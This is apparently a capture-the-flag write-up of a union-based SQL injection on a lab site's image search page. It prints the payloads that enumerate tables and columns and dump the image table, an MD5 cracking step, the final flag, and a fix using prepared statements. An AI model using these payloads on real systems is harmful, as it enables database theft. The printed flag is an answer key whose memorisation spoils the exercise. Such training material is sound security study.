# Where:
    /?page=searchimg
# How:
-By entering:

    -1 union select null, concat (table_name) from information_schema.tables where table_schema = database ()

-We get the following output:

    ID: -1 union select null, concat (table_name) from information_schema.tables where table_schema = database () 
    Title: list_images
    Url :
    
-This tells us that the only table is *list_images*.

-We then enter:

    -1 union select null, concat (column_name) from information_schema.columns where table_schema = database ()

-We get the following output:

    ID: -1 union select null, concat (column_name) from information_schema.columns where table_schema = database () 
    Title: id
    Url : 
    ID: -1 union select null, concat (column_name) from information_schema.columns where table_schema = database () 
    Title: url
    Url : 
    ID: -1 union select null, concat (column_name) from information_schema.columns where table_schema = database () 
    Title: title
    Url : 
    ID: -1 union select null, concat (column_name) from information_schema.columns where table_schema = database () 
    Title: comment
    Url :
    
-This tells us that there are the following columns: *id*, *url*, *title* and *comment*.

-We then enter:

    -1 union select NULL, concat (id, url, title, comment) from list_images

-We get all the images' information.
-The 5th image has the following comment that give us a string and instructions:

    Hack me ?If you read this just use this md5 decode lowercase then sha256 to win this flag ! : 1928e8083cf461a51303633093573c46

-If we decrypt *1928e8083cf461a51303633093573c46* at [MD5 Online](https://www.md5online.org/md5-decrypt.html) we receive the word *albatroz*
-Which we then hash using sha256 at [sha256 hash calculator](https://xorbin.com/tools/sha256-hash-calculator) to receive the flag.

# Flag:
    f2a29020ef3132e01dd61df97fd33ec8d7fcd1388cc9601e7db691d17d4d6188

# Possible abuses:
Hackers could potentially access all info in your BD even hashed passwords could potentially be decrypted using sites.

# Fix:
Use [prepared statements](https://www.w3schools.com/php/php_mysql_prepared_statements.asp) to prevent sql injections.<br>
I do also believe sha256 is a better hash to use especialy when combined with a salt.
